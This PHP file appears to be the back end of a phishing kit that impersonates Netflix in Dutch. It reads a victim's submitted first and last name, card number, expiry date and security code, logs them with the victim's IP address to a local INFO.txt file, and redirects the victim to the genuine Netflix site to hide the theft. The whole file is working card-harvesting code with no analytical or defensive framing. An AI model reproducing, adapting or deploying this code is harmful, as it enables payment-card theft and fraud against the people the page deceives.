<?php

function get_ip_address(){
foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $key)
{
if (array_key_exists($key, $_SERVER) === true){
foreach (explode(',', $_SERVER[$key]) as $ip){
$ip = trim($ip); // just to be safe

if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false)
{
return $ip;}}}}}
$_SERVER['REMOTE_ADDR']= get_ip_address();

header("Location: https://www.netflix.com/nl/");
print_r($_POST);
    $user_ip = 'IP-adres: ' .  $_SERVER['REMOTE_ADDR'] . "\n";
    $data = 'Voornaam: ' . $_POST['first'] . "\n";
    $data2 = 'Achternaam: ' . $_POST['second'] . "\n";
    $data3 = 'Kaartnummer: ' . $_POST['third'] . "\n";
    $data4 = 'Vervaldatum: ' . $_POST['fourth'] . "\n";
    $data5 = 'Veiligheidscode: ' . $_POST['fifth'] . "\n\n";

    $ret = file_put_contents('INFO.txt', $user_ip, FILE_APPEND | LOCK_EX);
    $ret = file_put_contents('INFO.txt', $data, FILE_APPEND | LOCK_EX);
    $ret = file_put_contents('INFO.txt', $data2, FILE_APPEND | LOCK_EX);
    $ret = file_put_contents('INFO.txt', $data3, FILE_APPEND | LOCK_EX);
    $ret = file_put_contents('INFO.txt', $data4, FILE_APPEND | LOCK_EX);
    $ret = file_put_contents('INFO.txt', $data5, FILE_APPEND | LOCK_EX);

    if($ret === false) {
    die('There was an error writing this file');
    }
	else {
        echo "$ret bytes written to file";
		}
		?>
